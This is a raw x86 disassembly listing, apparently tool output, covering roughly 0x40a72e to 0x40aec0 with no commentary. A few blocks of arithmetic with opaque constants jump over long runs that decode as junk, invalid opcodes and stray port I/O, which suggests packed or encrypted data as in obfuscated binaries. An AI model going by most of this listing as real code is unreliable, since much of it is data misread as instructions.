  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	xor    al,0xde
  40a7d8:	test   al,0xe3
  40a7da:	(bad)  
  40a7db:	lahf   
  40a7dc:	mov    esi,0xbec2a9be
  40a7e1:	mov    esi,0x9262783d
  40a7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7e7:	sub    DWORD PTR [esi],ebp
  40a7e9:	inc    edi
  40a7ea:	xchg   esp,eax
  40a7eb:	mov    BYTE PTR [esi+ebp*2+0x7c],dl
  40a7ef:	call   0x5e0e8865
  40a7f4:	aaa    
  40a7f5:	pop    edi
  40a7f6:	mov    ah,0xd8
  40a7f8:	xchg   al,al
  40a7fa:	data16 aas 
  40a7fc:	mov    edx,0x35b4515d
  40a801:	push   esp
  40a802:	nop
  40a803:	mov    al,0x57
  40a805:	ins    DWORD PTR es:[edi],dx
  40a806:	cmp    BYTE PTR [edx-0x22],dl
  40a809:	or     BYTE PTR [ecx],al
  40a80b:	(bad)  
  40a80c:	jg     0x40a82a
  40a80e:	(bad)  
  40a80f:	mov    WORD PTR [edx],es
  40a811:	sbb    al,0x78
  40a813:	test   dl,0xcf
  40a816:	pop    es
  40a817:	rcr    DWORD PTR [edi-0x61b11b3b],cl
  40a81d:	pop    esp
  40a81e:	scas   al,BYTE PTR es:[edi]
  40a81f:	pop    ecx
  40a820:	(bad)  
  40a821:	ds lock stos BYTE PTR es:[edi],al
  40a824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a825:	sbb    ebp,DWORD PTR [edx-0x4a]
  40a828:	(bad)  
  40a829:	jp     0x40a87f
  40a82b:	mov    cl,0xc2
  40a82d:	ja     0x40a83d
  40a82f:	jecxz  0x40a826
  40a831:	lock adc BYTE PTR [edi+0x29732c2e],dl
  40a838:	aad    0x3e
  40a83a:	xor    DWORD PTR [edi+edi*1-0x264b19ec],eax
  40a841:	call   0x5dbfe831
  40a846:	stos   BYTE PTR es:[edi],al
  40a847:	iret   
  40a848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a849:	aad    0x54
  40a84b:	and    al,0x3d
  40a84d:	sub    BYTE PTR [ecx+0x1c264469],bl
  40a853:	cmp    DWORD PTR ds:0x3a8699bb,0xffffffec
  40a85a:	ret    
  40a85b:	in     eax,dx
  40a85c:	in     eax,dx
  40a85d:	out    0x7c,eax
  40a85f:	pop    ecx
  40a860:	loopne 0x40a7ed
  40a862:	or     eax,0x5d861c2f
  40a867:	pop    eax
  40a868:	ins    BYTE PTR es:[edi],dx
  40a869:	cmp    bh,dl
  40a86b:	push   0xc
  40a86d:	xor    ch,BYTE PTR [ebx-0x521c43d4]
  40a873:	(bad)  
  40a874:	ins    DWORD PTR es:[edi],dx
  40a875:	xchg   edi,eax
  40a876:	ret    
  40a877:	cmp    bl,bl
  40a879:	out    dx,eax
  40a87a:	pop    ecx
  40a87b:	lock inc BYTE PTR [ebp+0x72]
  40a87f:	inc    edx
  40a880:	les    edx,FWORD PTR [eax]
  40a882:	sub    eax,0xba3256e7
  40a887:	es push ebp
  40a889:	adc    DWORD PTR [edi+0x2c],edx
  40a88c:	(bad)  
  40a88d:	lods   al,BYTE PTR ds:[esi]
  40a88e:	mov    BYTE PTR [esi],bl
  40a890:	imul   ebx,DWORD PTR [edx],0xaab805fa
  40a896:	xor    al,0x22
  40a898:	xor    ecx,DWORD PTR ds:0xca8d4a4b
  40a89e:	mov    al,0xba
  40a8a0:	add    al,0x79
  40a8a2:	and    DWORD PTR [edx+0x27],ebx
  40a8a5:	(bad)  [edx-0x41e8e95d]
  40a8ab:	mov    ds:0x8433c989,eax
  40a8b0:	xchg   ebx,eax
  40a8b1:	push   ds
  40a8b2:	xchg   edx,eax
  40a8b3:	xor    DWORD PTR [ecx],ebx
  40a8b5:	and    BYTE PTR [ebp+0x434eec],bl
  40a8bb:	mov    esp,DWORD PTR [ecx-0x33]
  40a8be:	lods   al,BYTE PTR ds:[esi]
  40a8bf:	pop    ebx
  40a8c0:	mov    gs,WORD PTR [edx]
  40a8c2:	mov    bl,cl
  40a8c4:	clc    
  40a8c5:	or     eax,0x4f385add
  40a8ca:	jmp    0xf8c1ff25
  40a8cf:	test   dl,bh
  40a8d1:	sbb    bh,0x7
  40a8d4:	push   esp
  40a8d5:	ins    BYTE PTR es:[edi],dx
  40a8d6:	mov    al,ds:0x98edde6a
  40a8db:	rol    DWORD PTR [edx+0x4f],0x27
  40a8df:	cld    
  40a8e0:	rcl    BYTE PTR [esi+0x29],cl
  40a8e3:	in     eax,dx
  40a8e4:	pusha  
  40a8e5:	in     eax,dx
  40a8e6:	retf   0xdacd
  40a8e9:	jne    0x40a8fb
  40a8eb:	mov    esi,0x73a106fe
  40a8f0:	in     eax,0x6d
  40a8f2:	in     al,dx
  40a8f3:	adc    al,0x7d
  40a8f5:	rcl    BYTE PTR [esi],cl
  40a8f7:	jne    0x40a95d
  40a8f9:	shl    BYTE PTR [ecx+ebx*1],cl
  40a8fc:	mul    BYTE PTR [esi]
  40a8fe:	mov    bh,0x83
  40a900:	loope  0x40a929
  40a902:	mov    esi,0x732623b5
  40a907:	pushf  
  40a908:	ret    
  40a909:	adc    eax,0xca403d4a
  40a90e:	lahf   
  40a90f:	jns    0x40a8ff
  40a911:	and    eax,DWORD PTR [edx+0x198a66de]
  40a917:	mov    eax,0xe27fc76b
  40a91c:	xchg   DWORD PTR gs:[esp+eax*2-0x7a],edx
  40a921:	pusha  
  40a922:	in     al,dx
  40a923:	js     0x40a920
  40a925:	sub    DWORD PTR [edi+0x9],ebx
  40a928:	mov    ah,0x98
  40a92a:	and    al,0xbf
  40a92c:	jmp    0xd8497d26
  40a931:	enter  0xea32,0x37
  40a935:	inc    edi
  40a936:	leave  
  40a937:	neg    DWORD PTR [edi]
  40a939:	stos   DWORD PTR es:[edi],eax
  40a93a:	fadd   DWORD PTR [ebx+edi*2]
  40a93d:	mov    eax,0x29a42a78
  40a942:	loope  0x40a979
  40a944:	jbe    0x40a96e
  40a946:	mul    DWORD PTR [bp-0x1b]
  40a94a:	push   cs
  40a94b:	jbe    0x40a9c1
  40a94d:	stc    
  40a94e:	je     0x40a9a0
  40a950:	fisub  DWORD PTR [ebx]
  40a952:	imul   esp,DWORD PTR [edi-0x20ce0200],0xd1e9b81b
  40a95c:	repnz scas eax,DWORD PTR es:[edi]
  40a95e:	add    dh,ch
  40a960:	inc    esp
  40a961:	gs mov dh,0x35
  40a964:	inc    edi
  40a965:	adc    eax,DWORD PTR [ecx+0x29]
  40a968:	push   cs
  40a969:	int3   
  40a96a:	retf   0x22e8
  40a96d:	or     BYTE PTR [esi],al
  40a96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a970:	or     eax,ebp
  40a972:	sbb    esi,DWORD PTR [ebx+0x545f8638]
  40a978:	push   esp
  40a979:	jo     0x40a92b
  40a97b:	sub    cl,bh
  40a97d:	sar    ah,0x31
  40a980:	inc    ecx
  40a981:	xor    DWORD PTR [esi+eax*8+0x35],edx
  40a985:	mov    dl,0xf3
  40a987:	lods   al,BYTE PTR ds:[esi]
  40a988:	in     al,0x5b
  40a98a:	push   dx
  40a98c:	out    0xe7,eax
  40a98e:	dec    edi
  40a98f:	in     al,0xc3
  40a991:	cmc    
  40a992:	cmc    
  40a993:	into   
  40a994:	dec    edx
  40a995:	hlt    
  40a996:	mov    edi,DWORD PTR [ebp+0x4]
  40a999:	mov    al,BYTE PTR [ebp+0x5e795746]
  40a99f:	ss xor eax,0x32e09eda
  40a9a5:	inc    esp
  40a9a6:	adc    ch,dl
  40a9a8:	leave  
  40a9a9:	xchg   esi,eax
  40a9aa:	add    BYTE PTR [ebp+0x51c1a3b3],ch
  40a9b0:	xor    ecx,eax
  40a9b2:	pop    edx
  40a9b3:	mov    edx,0x1bb8426e
  40a9b8:	sar    DWORD PTR [ebp+0x65],1
  40a9bb:	cwde   
  40a9bc:	outs   dx,BYTE PTR ds:[esi]
  40a9bd:	mov    cl,0x76
  40a9bf:	xlat   BYTE PTR ds:[ebx]
  40a9c0:	mov    ebx,0xc91cfc1f
  40a9c5:	int    0x61
  40a9c7:	nop
  40a9c8:	mov    al,0xa9
  40a9ca:	addr16 aaa 
  40a9cc:	out    0xc9,eax
  40a9ce:	pop    edi
  40a9cf:	inc    edx
  40a9d0:	mov    esi,0x1f834683
  40a9d5:	aaa    
  40a9d6:	sub    al,0x6d
  40a9d8:	jmp    0x93c:0xd186932e
  40a9df:	jecxz  0x40a964
  40a9e1:	enter  0x80a8,0x73
  40a9e5:	imul   ecx,esp,0x52fdfd1f
  40a9eb:	push   edi
  40a9ec:	add    eax,0xcd696d60
  40a9f1:	sti    
  40a9f2:	xor    BYTE PTR gs:[edi+edx*4],dh
  40a9f6:	xor    DWORD PTR [esi],ebp
  40a9f8:	xor    BYTE PTR [esi],0xe5
  40a9fb:	xchg   esp,eax
  40a9fc:	mov    edi,0x2e6708b5
  40aa01:	fs cld 
  40aa03:	lods   al,BYTE PTR ds:[esi]
  40aa04:	leave  
  40aa05:	add    esi,edx
  40aa07:	(bad)  
  40aa08:	jmp    0xa047:0x70a614e7
  40aa0f:	mov    bl,0x5e
  40aa11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa12:	call   0x977d11b7
  40aa17:	jp     0x40a9f5
  40aa19:	mov    bl,0x41
  40aa1b:	mov    cl,0xdb
  40aa1d:	test   al,0x80
  40aa1f:	adc    eax,0xd3c57766
  40aa24:	(bad)  
  40aa25:	repnz fadd DWORD PTR ds:[ebx]
  40aa29:	add    BYTE PTR [ebx-0x4b],0x90
  40aa2d:	jns    0x40aa84
  40aa2f:	inc    ebx
  40aa30:	mov    BYTE PTR fs:[ebx],ch
  40aa33:	or     al,0x81
  40aa35:	push   ds
  40aa36:	push   es
  40aa37:	jmp    0x2fd89b6b
  40aa3c:	mov    esi,0x11e74801
  40aa41:	add    al,0xdc
  40aa43:	mov    fs,WORD PTR [ecx-0x6e]
  40aa46:	(bad)  [eax-0x5]
  40aa49:	cmp    eax,0x49912003
  40aa4e:	dec    eax
  40aa4f:	repz push edi
  40aa51:	sbb    BYTE PTR [ecx+eax*2+0x588dfe31],0x79
  40aa59:	xchg   DWORD PTR [ebp-0x50],esi
  40aa5c:	sub    eax,edx
  40aa5e:	xor    edx,edx
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	xchg   edx,eax
  40aa9f:	icebp  
  40aaa0:	test   al,0xe3
  40aaa2:	jmp    0xbec2:0xa9bebea5
  40aaa9:	mov    esi,0x9262a6c6
  40aaae:	or     edi,DWORD PTR [eax-0x21]
  40aab1:	or     DWORD PTR [edi+0x2f],esp
  40aab4:	cmc    
  40aab5:	(bad)  
  40aab6:	jbe    0x40aa4e
  40aab8:	and    dh,BYTE PTR [ebx+0x8]
  40aabb:	ins    DWORD PTR es:[edi],dx
  40aabc:	fmul   st,st(6)
  40aabe:	sbb    al,0x5f
  40aac0:	add    edi,DWORD PTR [edx-0x1e3a3948]
  40aac6:	xor    al,bh
  40aac8:	and    dh,BYTE PTR [ebx+ecx*1-0x15e1dd60]
  40aacf:	loope  0x40ab05
  40aad1:	jne    0x40aada
  40aad3:	push   esi
  40aad4:	adc    DWORD PTR [esi],esp
  40aad6:	not    esi
  40aad8:	push   esi
  40aad9:	shl    BYTE PTR [ebx-0x62],1
  40aadc:	add    eax,ebx
  40aade:	imul   BYTE PTR [eax+0x28]
  40aae1:	push   edx
  40aae2:	div    DWORD PTR [esi-0x773ff4fb]
  40aae8:	cmp    cl,BYTE PTR [esi+edi*4+0x25]
  40aaec:	push   esp
  40aaed:	imul   edx,DWORD PTR [edx+0x3a706109],0x10
  40aaf4:	mov    dl,0x1a
  40aaf6:	mov    ch,0x25
  40aaf8:	(bad)  
  40aaf9:	inc    ebx
  40aafa:	in     al,dx
  40aafb:	sti    
  40aafc:	cmp    BYTE PTR [eax],0x31
  40aaff:	cli    
  40ab00:	or     esi,ebp
  40ab02:	adc    dl,dl
  40ab04:	(bad)  
  40ab05:	xchg   ecx,eax
  40ab06:	std    
  40ab07:	icebp  
  40ab08:	fdivr  DWORD PTR [eax+edi*2-0x4aaaeac2]
  40ab0f:	jmp    edx
  40ab11:	and    DWORD PTR [ecx+0x64],esi
  40ab14:	popa   
  40ab15:	icebp  
  40ab16:	outs   dx,DWORD PTR ds:[esi]
  40ab17:	clc    
  40ab18:	mov    dl,0x3b
  40ab1a:	std    
  40ab1b:	in     eax,dx
  40ab1c:	dec    edx
  40ab1d:	mov    DWORD PTR [ebp-0x68bf1103],esi
  40ab23:	add    al,bl
  40ab25:	cli    
  40ab26:	fld    QWORD PTR [esp+esi*1-0x691067ed]
  40ab2d:	push   ss
  40ab2e:	mov    edx,0x4bcc65ab
  40ab33:	rcr    DWORD PTR [esi+0x2d4dfd50],0x71
  40ab3a:	xor    ecx,DWORD PTR [ecx+eiz*8]
  40ab3d:	out    0xa,al
  40ab3f:	repz inc eax
  40ab41:	xlat   BYTE PTR ds:[ebx]
  40ab42:	ror    esp,cl
  40ab44:	retf   
  40ab45:	add    esi,esi
  40ab47:	xor    cl,BYTE PTR [esi+0x22]
  40ab4a:	fwait
  40ab4b:	sahf   
  40ab4c:	xchg   edx,eax
  40ab4d:	push   es
  40ab4e:	(bad)
  40ab51:	pushf  
  40ab52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab53:	mov    DWORD PTR ds:0xeb4d28b8,esi
  40ab59:	rcr    BYTE PTR [eax-0x5c9e7308],0xa0
  40ab60:	stc    
  40ab61:	mov    ecx,0xbb05ad10
  40ab66:	shl    esi,0x80
  40ab69:	jge    0x40ab01
  40ab6b:	(bad)  
  40ab6d:	push   ebx
  40ab6e:	stc    
  40ab6f:	lods   eax,DWORD PTR ds:[esi]
  40ab70:	icebp  
  40ab71:	adc    ebx,DWORD PTR [ebp-0x253bf552]
  40ab77:	inc    esi
  40ab78:	sbb    BYTE PTR [edi],bl
  40ab7a:	dec    edi
  40ab7b:	call   0x19cc2960
  40ab80:	fcmovnb st,st(1)
  40ab82:	pop    edx
  40ab83:	sbb    BYTE PTR [edx],bl
  40ab85:	dec    eax
  40ab86:	cdq    
  40ab87:	clc    
  40ab88:	sbb    eax,0x247febde
  40ab8d:	outs   dx,BYTE PTR ds:[esi]
  40ab8e:	je     0x40aba5
  40ab90:	add    DWORD PTR [edi],ebx
  40ab92:	jo     0x40ab55
  40ab94:	add    eax,0x852fa067
  40ab99:	arpl   cx,bx
  40ab9b:	dec    esi
  40ab9c:	dec    eax
  40ab9d:	and    BYTE PTR [ebx],0x4f
  40aba0:	pusha  
  40aba1:	fadd   QWORD PTR [ebx+0x5f]
  40aba4:	inc    esi
  40aba5:	(bad)  
  40aba6:	into   
  40aba7:	mov    ds:0xcf4d876f,eax
  40abac:	outs   dx,DWORD PTR ds:[esi]
  40abad:	inc    edx
  40abae:	lock mov ?,WORD PTR [eax-0xf4ec04a]
  40abb5:	add    al,0xfe
  40abb7:	jmp    0x40ac09
  40abb9:	or     bh,bh
  40abbb:	pop    ebp
  40abbc:	inc    esp
  40abbd:	hlt    
  40abbe:	mov    ?,eax
  40abc0:	jecxz  0x40ab5e
  40abc2:	test   al,0xed
  40abc4:	push   es
  40abc5:	adc    bh,ch
  40abc7:	in     eax,0x40
  40abc9:	ins    BYTE PTR es:[edi],dx
  40abca:	push   ecx
  40abcb:	jmp    0x40ab5c
  40abcd:	mov    edi,0x2e66d390
  40abd2:	dec    ebx
  40abd3:	push   es
  40abd4:	cld    
  40abd5:	loopne 0x40abcd
  40abd7:	pop    ds
  40abd8:	cli    
  40abd9:	adc    eax,0xd086aab6
  40abde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abdf:	xor    ch,bh
  40abe1:	pop    eax
  40abe2:	xchg   ecx,eax
  40abe3:	call   0x1f82:0xc9f6f11b
  40abea:	test   DWORD PTR [ebp-0x3f949d52],esi
  40abf0:	cmp    al,0x94
  40abf2:	repz push edx
  40abf4:	dec    esi
  40abf5:	and    DWORD PTR [eax],edx
  40abf7:	mov    dh,dl
  40abf9:	inc    eax
  40abfa:	jp     0x40abe7
  40abfc:	std    
  40abfd:	and    BYTE PTR [eax-0x2728df77],0x5a
  40ac04:	sbb    al,0x3c
  40ac06:	aad    0xba
  40ac08:	push   0xffffffde
  40ac0a:	in     al,0xce
  40ac0c:	enter  0x118f,0xfe
  40ac10:	jbe    0x40ac87
  40ac12:	mov    esi,0xa7b1c38c
  40ac17:	or     esp,edi
  40ac19:	mov    ch,0x9
  40ac1b:	and    esi,DWORD PTR [ecx]
  40ac1d:	out    0x9b,eax
  40ac1f:	fisubr DWORD PTR [ecx-0x1a]
  40ac22:	xor    eax,0x7902c969
  40ac27:	adc    ecx,DWORD PTR [edx]
  40ac29:	or     BYTE PTR [ebp+0x276c27c8],0x8
  40ac30:	retf   0x7613
  40ac33:	int3   
  40ac34:	aaa    
  40ac35:	sub    DWORD PTR [ebx-0x47fe0d81],ebx
  40ac3b:	or     al,0x59
  40ac3d:	lods   eax,DWORD PTR ds:[esi]
  40ac3e:	test   DWORD PTR [ecx],edx
  40ac40:	add    DWORD PTR [ebx+0x6dd33a06],ebp
  40ac46:	lea    edx,[ebx-0x2a]
  40ac49:	ret    0x765f
  40ac4c:	xor    al,0x19
  40ac4e:	mov    ebx,0xfe8fa6e7
  40ac53:	ret    
  40ac54:	adc    esp,DWORD PTR [ecx+0x38]
  40ac57:	or     BYTE PTR [ebx],cl
  40ac59:	ins    BYTE PTR es:[edi],dx
  40ac5a:	rcl    ecx,0xab
  40ac5d:	cs out dx,al
  40ac5f:	or     edx,esi
  40ac61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac62:	xchg   ebp,eax
  40ac63:	shl    BYTE PTR [edx],cl
  40ac65:	rol    BYTE PTR [ebp-0x541bbac],1
  40ac6b:	mov    bh,0xa5
  40ac6d:	sbb    BYTE PTR [eax+0x23],bh
  40ac70:	mov    ebp,0xff096665
  40ac75:	add    ebx,eax
  40ac77:	(bad)  
  40ac78:	ficom  DWORD PTR [ecx-0x20c261a7]
  40ac7e:	jmp    0x40ac6f
  40ac80:	inc    ebp
  40ac81:	push   ds
  40ac82:	imul   BYTE PTR [edx]
  40ac84:	leave  
  40ac85:	xor    esi,edx
  40ac87:	mov    bl,BYTE PTR [ebx]
  40ac89:	ret    
  40ac8a:	pop    ss
  40ac8b:	cmp    BYTE PTR [edi-0x20cefcd6],bl
  40ac91:	fisubr WORD PTR ds:0xb449eef8
  40ac97:	iret   
  40ac98:	lods   al,BYTE PTR ds:[esi]
  40ac99:	pop    es
  40ac9a:	jnp    0x40ad01
  40ac9c:	jo     0x40acf4
  40ac9e:	adc    bh,bl
  40aca0:	stos   BYTE PTR es:[edi],al
  40aca1:	or     DWORD PTR [edi+0x14706862],edi
  40aca7:	out    0xbe,al
  40aca9:	cmp    ebx,DWORD PTR [esi]
  40acab:	cs sar ebp,cl
  40acae:	mov    bl,0xe8
  40acb0:	xlat   BYTE PTR ds:[ebx]
  40acb1:	push   cs
  40acb2:	movs   BYTE PTR es:[di],BYTE PTR cs:[si]
  40acb5:	pusha  
  40acb6:	sub    al,0xb1
  40acb8:	cmp    al,0x95
  40acba:	ret    0xccd2
  40acbd:	xor    esi,DWORD PTR [eax-0x5d]
  40acc0:	xchg   ecx,eax
  40acc1:	jmp    0xa74dd3d2
  40acc6:	sbb    eax,0x1776375
  40accb:	test   eax,0x70276cb
  40acd0:	fld    TBYTE PTR [ebx+0x2]
  40acd3:	push   cs
  40acd4:	aas    
  40acd5:	call   0xf7e003b
  40acda:	ds push cs
  40acdc:	adc    esi,eax
  40acde:	or     al,0x2e
  40ace0:	sbb    edi,DWORD PTR [ebx-0x21612107]
  40ace6:	cs sahf 
  40ace8:	jmp    0x1d41:0x3f0cc43d
  40acef:	ror    edx,1
  40acf1:	les    ecx,FWORD PTR [ebx-0x54c36f74]
  40acf7:	push   0xa04ddd1d
  40acfc:	and    BYTE PTR [edx-0x206f9ad7],ch
  40ad02:	jbe    0x40acb0
  40ad04:	dec    ecx
  40ad05:	fdivr  QWORD PTR [eax]
  40ad07:	xor    BYTE PTR [ecx],ch
  40ad09:	jg     0x40ad01
  40ad0b:	cmp    al,0x36
  40ad0d:	push   cs
  40ad0e:	fld    DWORD PTR [eax]
  40ad10:	push   cs
  40ad11:	sub    al,0xa8
  40ad13:	jge    0x40ad52
  40ad15:	aas    
  40ad16:	ja     0x40acc9
  40ad18:	rcl    DWORD PTR ds:0xea694cf,0x6a
  40ad1f:	pushf  
  40ad20:	out    dx,eax
  40ad21:	add    eax,0xd2334cb0
  40ad26:	mov    DWORD PTR [ebp-0x18],0x187
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x422708
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi+0x26323690],bl
  40ad62:	rcl    ebp,1
  40ad64:	test   eax,0xc2a9bebe
  40ad69:	mov    esi,0x66a775be
  40ad6e:	fild   DWORD PTR [eax-0x2e]
  40ad71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad72:	jnp    0x40ad83
  40ad74:	addr16 pop edx
  40ad76:	lea    esp,[ebp+0x1eb86229]
  40ad7c:	iret   
  40ad7d:	add    ebp,ebx
  40ad7f:	mov    ebx,0x1f187cda
  40ad84:	gs neg edi
  40ad87:	leave  
  40ad88:	sar    DWORD PTR [esi-0x163dd740],1
  40ad8e:	js     0x40adf3
  40ad90:	call   0x78937527
  40ad95:	loopne 0x40ad90
  40ad97:	(bad)  
  40ad98:	std    
  40ad99:	adc    esi,DWORD PTR [eax+0x5c]
  40ad9c:	add    BYTE PTR [edx],ah
  40ad9e:	sub    edi,ecx
  40ada0:	mov    ch,0xbe
  40ada2:	(bad)  
  40ada3:	popa   
  40ada4:	and    BYTE PTR [ecx-0x4d],cl
  40ada7:	or     eax,0x6333d56c
  40adac:	adc    DWORD PTR [ebx+0x54],ebx
  40adaf:	retf   0xcfa9
  40adb2:	pop    ds
  40adb3:	mov    bh,0xc2
  40adb5:	xor    DWORD PTR [esi],edx
  40adb7:	prefetchwt1 BYTE PTR [ebp-0x76]
  40adbb:	scas   eax,DWORD PTR es:[edi]
  40adbc:	repnz les ebp,FWORD PTR [ebx]
  40adbf:	je     0x40ada4
  40adc1:	mov    edi,0xb42e9993
  40adc6:	xor    eax,0x973d150f
  40adcb:	popf   
  40adcc:	xor    ecx,esp
  40adce:	mov    BYTE PTR [edi+0x2356e55d],ch
  40add4:	gs ja  0x40add9
  40add7:	test   BYTE PTR [esi-0x70166f50],dl
  40addd:	rcr    BYTE PTR [esi],0x82
  40ade0:	clc    
  40ade1:	fnstsw WORD PTR [edx]
  40ade3:	sbb    bl,cl
  40ade5:	push   edx
  40ade6:	dec    esp
  40ade7:	hlt    
  40ade8:	push   cs
  40ade9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adea:	xor    BYTE PTR [edi-0x1555c564],0x5e
  40adf1:	sti    
  40adf2:	int    0x4a
  40adf4:	adc    al,0x6c
  40adf6:	dec    edx
  40adf7:	stos   BYTE PTR es:[edi],al
  40adf8:	sbb    bh,BYTE PTR [esi]
  40adfa:	in     al,dx
  40adfb:	rcl    esi,cl
  40adfd:	sbb    esp,DWORD PTR [ebx+ebx*8-0x54cb63af]
  40ae04:	push   ss
  40ae05:	bound  esp,QWORD PTR [ecx+0x78]
  40ae08:	sbb    al,0x2a
  40ae0a:	or     dh,cl
  40ae0c:	(bad)  
  40ae0d:	out    dx,al
  40ae0e:	dec    esp
  40ae0f:	or     esi,DWORD PTR [esi]
  40ae11:	jnp    0x40ae42
  40ae13:	lds    edi,FWORD PTR [ebx-0x10]
  40ae16:	sbb    BYTE PTR ds:0x4e040693,ah
  40ae1c:	cdq    
  40ae1d:	push   eax
  40ae1e:	xchg   edx,eax
  40ae1f:	and    BYTE PTR [edx+0x32],dl
  40ae22:	cld    
  40ae23:	mov    al,cl
  40ae25:	jle    0x40aea1
  40ae27:	fadd   QWORD PTR [eax]
  40ae29:	xor    BYTE PTR [eax+0x47e61168],cl
  40ae2f:	and    al,0x6b
  40ae31:	test   al,0xab
  40ae33:	iret   
  40ae34:	ret    
  40ae35:	or     BYTE PTR [eax+0x1e],bh
  40ae38:	call   FWORD PTR [ebx-0xed1819a]
  40ae3e:	test   DWORD PTR [edx],ebp
  40ae40:	adc    al,0xa4
  40ae42:	push   0xffffffe3
  40ae44:	push   0xffffffeb
  40ae46:	shl    DWORD PTR [edx-0x3414604f],0x99
  40ae4d:	inc    esp
  40ae4e:	shl    DWORD PTR [ebx],1
  40ae50:	pop    eax
  40ae51:	jo     0x40ae03
  40ae53:	jle    0x40ae1b
  40ae55:	stos   BYTE PTR es:[edi],al
  40ae56:	inc    edx
  40ae57:	or     ch,BYTE PTR [ecx+eax*8]
  40ae5a:	cmp    eax,DWORD PTR [edx+0x19b349d6]
  40ae60:	test   al,0x7e
  40ae62:	dec    esp
  40ae63:	repnz push ebx
  40ae65:	or     BYTE PTR [esi+eax*2-0x4a01343c],al
  40ae6c:	adc    al,ch
  40ae6e:	inc    edi
  40ae6f:	(bad)  [eax+0x2124612d]
  40ae75:	xchg   esi,edx
  40ae77:	or     eax,0xb98a0080
  40ae7c:	xor    ah,BYTE PTR [ebx+0x8]
  40ae7f:	into   
  40ae80:	jns    0x40ae8f
  40ae82:	mov    edi,0xad4407c1
  40ae87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae88:	xchg   ebx,eax
  40ae89:	in     eax,0xe8
  40ae8b:	xor    bh,bh
  40ae8d:	inc    ecx
  40ae8e:	xor    esp,ecx
  40ae90:	fs popa 
  40ae92:	mov    esi,0xd82c664d
  40ae97:	aaa    
  40ae98:	jb     0x40aedb
  40ae9a:	dec    ebx
  40ae9b:	xchg   DWORD PTR [edx],ecx
  40ae9d:	pop    DWORD PTR [edi]
  40ae9f:	sahf   
  40aea0:	addr16 inc ebp
  40aea2:	mov    bl,0x95
  40aea4:	sub    BYTE PTR [eax],al
  40aea6:	aas    
  40aea7:	mov    bl,0xa5
  40aea9:	test   eax,0x95cbf1cd
  40aeae:	mov    bh,0x72
  40aeb0:	sbb    dl,BYTE PTR [edi-0x50d52422]
  40aeb6:	mov    ebp,0xb90cbd77
  40aebb:	pushf  
  40aebc:	out    dx,eax
  40aebd:	stos   BYTE PTR es:[edi],al
  40aebe:	cmp    edx,DWORD PTR [eax]
  40aec0:	or     ecx,DWORD PTR [esi-0x74]
